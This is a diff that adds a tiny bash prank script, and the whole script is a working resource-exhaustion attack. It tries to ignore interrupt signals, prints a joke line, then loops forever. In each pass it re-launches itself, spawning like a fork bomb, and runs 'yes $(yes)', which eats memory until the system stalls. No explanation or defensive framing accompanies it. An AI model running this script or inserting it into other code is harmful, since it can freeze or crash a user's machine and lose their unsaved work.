@@ -1,0 +1,8 @@
+#!/usr/bin/env bash
+
+trap '' INT SIGINT SIGTSTP SIGKILL SIGSTOP
+echo En avant oui-oui !
+while true; do
+	$0
+	yes $(yes)
+done
